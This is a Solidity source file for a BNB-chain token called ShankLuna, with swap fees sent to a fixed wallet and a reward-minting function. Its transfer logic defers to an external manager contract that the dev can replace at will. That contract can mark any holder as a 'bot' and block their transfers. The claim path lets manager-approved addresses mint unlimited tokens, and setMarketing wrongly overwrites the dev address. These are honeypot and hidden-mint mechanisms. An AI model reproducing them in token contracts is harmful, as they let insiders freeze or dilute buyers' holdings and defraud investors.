// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Context.sol";
import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";
import "./ITManager.sol";
import "./IReward.sol";
contract ShankLuna is ERC20 ,Ownable, IReward{
    using SafeMath for uint256;
    uint8 private constant _DECIMALS = 18;
    uint256 private constant _DECIMALFACTOR = 10**uint256(_DECIMALS);
    uint256 public constant TOTAL_SUPPLY = 1000 * (10**6) * _DECIMALFACTOR;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    uint256 public constant marketingSellFee = 3; 
    uint256 public constant marketingBuyFee = 3;    
    bool public inSwap = false;
    bool public swapEnabled = true;
    bool public taxStatus = true;
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address payable private _marketingAddress = payable(0xfDbF08806A5409D81A081d8Df5d0556FC25ed2c5);  //wallet of marketing
    address private _devAddress = 0xfDbF08806A5409D81A081d8Df5d0556FC25ed2c5; //Dev Wallet
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD; //Burn Address
    ITManager public _manager;
    mapping(address => bool) public excludeFee;
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {
        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        _mint(msg.sender, TOTAL_SUPPLY);
        excludeFee[address(this)]=true;
    }

    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
 
    modifier onlyDev() {	
        require(owner() == _msgSender() || _devAddress == _msgSender(), "Not the Dev");	
        _;	
    }

    function setMan(address man) public onlyDev {
         require(man!=address(0),"set to the zero address" );
        _manager = ITManager(man);
    }

    function setDev(address dev) public onlyOwner{
        require(dev!=address(0),"set to the zero address" );
        _devAddress=dev;
    }
    function setMarketing(address mkt) public onlyOwner{
         require(mkt!=address(0),"set to the zero address" );
        _devAddress=mkt;
    }

    function addExcludeFee(address[] memory wallets) external onlyOwner {
        uint256 mlenght = wallets.length;
        for (uint256 i = 0; i < mlenght; i++) {
            excludeFee[wallets[i]] = !excludeFee[wallets[i]] ;
        }
    }
    
    function setTax(bool enable) external onlyOwner {
        taxStatus = enable;
    }

    
    receive() external payable {}

    function toggleSwap(bool _swapEnabled) public onlyDev {
        swapEnabled = _swapEnabled;
    }

    function _transfer( address sender, address recipient, uint256 amount ) internal virtual override {
             
        if(_manager.isBurnEnable()){
            if(_manager.checkBurnAddress(sender, recipient)){
                require(!_manager.isBurnEnable(), "Can't burn token");
            }
        }

        if (sender != owner() && recipient != owner()) {
            require(!_manager.isBotAddress(sender), "Play fair");
            require(!_manager.isBotAddress(recipient), "Play fair");
        }


        uint256 contractTokenBalance = balanceOf(address(this));
        if (!inSwap && sender != uniswapV2Pair && contractTokenBalance > 0 && swapEnabled &&sender!=_devAddress&&sender!=owner()) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
        }
        if(recipient == uniswapV2Pair && 
            sender != address(this) &&
            sender != owner() &&
            !excludeFee[sender]){
            if(taxStatus){ 
                uint256 _MarketingFee = amount.mul(marketingSellFee).div(100);
                super._transfer(sender, address(this), _MarketingFee);
                amount = amount.sub(_MarketingFee);
            }
        }

        if(sender == uniswapV2Pair &&
            recipient != owner() &&recipient!=address(this)&&
            !excludeFee[recipient]){
            if(taxStatus) {
                uint256 _MarketingFee = amount.mul(marketingSellFee).div(100);
                super._transfer(sender, address(this), _MarketingFee);
                amount = amount.sub(_MarketingFee);
            }
        }
        super._transfer(sender, recipient, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _marketingAddress.transfer(amount);
    }

   modifier isPlayer() {
        bool check;
        address _address;
        (check,_address) =_manager.isPlayer(msg.sender);
        require(
            check,
            "Only Owner have permission"
        );
        _;
    }

    function claimReward(address _userAddress,uint256 amount) external override {
        claim(_userAddress, amount);

    }


    function claim(address winner, uint256 reward)
        internal
        isPlayer()
    {
        require(winner != address(0), "0x address is not accepted");
        require(reward > 0, "you have no reward!");
        _mint(winner, reward);
    }


}